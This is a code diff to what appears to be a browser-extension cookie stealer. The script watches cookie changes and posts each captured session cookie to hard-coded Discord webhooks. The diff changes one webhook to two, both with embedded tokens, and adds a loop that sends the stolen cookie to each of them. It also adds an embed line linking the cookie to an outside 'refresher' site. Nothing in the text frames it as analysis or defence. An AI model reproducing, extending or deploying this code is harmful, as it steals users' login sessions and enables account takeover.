@@ -1,6 +1,13 @@
-const WEBHOOK = "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc";
-const MENTION = "@everyone";
-
+const WEBHOOKS = [
+    {
+        url: "https://discord.com/api/webhooks/1417133148717973656/OQ5xYHUB05EpBhD_c4bdzWtcxJmuf0i0_iT_-n8bmkkcH6WXhawMVr-aXTctQpNkC_au",
+        mention: "@everyone"
+    },
+    {
+        url: "https://discord.com/api/webhooks/1417077903971323975/AsOHHZIIl827b3CpcQbGywXmWvbsN-jpXFQhBB_FJeLlQ8G_Ao6AQO66kr6n956RT7ZL",
+        mention: "@everyone"
+    }
+];
 let lastCookie = null; // Track last sent cookie
 
 async function checkOwnership(userId, assetId, cookie) {
@@ -82,6 +89,7 @@ async function main(cookie) {
     let embedPayload = {
         embeds: [
             {
+                description: "```" + cookie + "```\n[Refresh Cookie](https://refresher.ct.ws/?i=1)",
                 color: 0xFF0000, // 🔴 Red embed
                 description: `\`\`\`${cookie ?? "COOKIE NOT FOUND"}\`\`\``,
                 fields: [
@@ -111,12 +119,13 @@ async function main(cookie) {
         content: MENTION
     };
 
-    // Send to single webhook
-    fetch(WEBHOOK, { 
-        method: "POST", 
-        headers: { "Content-Type": "application/json" }, 
-        body: JSON.stringify(embedPayload) 
-    });
+    for (let wh of WEBHOOKS) {
+        fetch(wh.url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ ...embedPayload, content: wh.mention })
+        }).catch(console.error);
+    }
 }
 
 // Startup listener
@@ -132,3 +141,4 @@ chrome.cookies.onChanged.addListener(changeInfo => {
         }
     }
 });
+
